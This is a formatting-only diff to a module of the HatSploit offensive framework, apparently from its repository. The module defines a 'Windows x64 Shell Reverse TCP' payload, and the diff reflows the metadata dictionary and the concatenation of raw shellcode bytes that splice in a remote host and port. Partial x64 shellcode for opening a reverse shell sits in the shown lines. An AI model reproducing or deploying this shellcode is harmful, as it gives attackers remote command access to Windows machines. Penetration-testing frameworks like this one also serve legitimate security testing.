@@ -13,14 +13,12 @@ class HatSploitPayload(Payload, Socket):
     details = {
         'Name': "Windows x64 Shell Reverse TCP",
         'Payload': "windows/x64/shell_reverse_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080) - payload developer'
-        ],
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
         'Description': "Reverse shell TCP payload for Windows x64.",
         'Architecture': "x64",
         'Platform': "windows",
         'Rank': "low",
-        'Type': "reverse_tcp"
+        'Type': "reverse_tcp",
     }
 
     def run(self):
@@ -53,8 +51,10 @@ class HatSploitPayload(Payload, Socket):
             b"\x57\xff\xff\xff\x5d\x49\xbe\x77\x73"
             b"\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
             b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
-            b"\x49\x89\xe5\x49\xbc\x02\x00" + remote_host + remote_port +
-            b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41"
+            b"\x49\x89\xe5\x49\xbc\x02\x00"
+            + remote_host
+            + remote_port
+            + b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41"
             b"\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89"
             b"\xea\x68\x01\x01\x00\x00\x59\x41\xba"
             b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d"
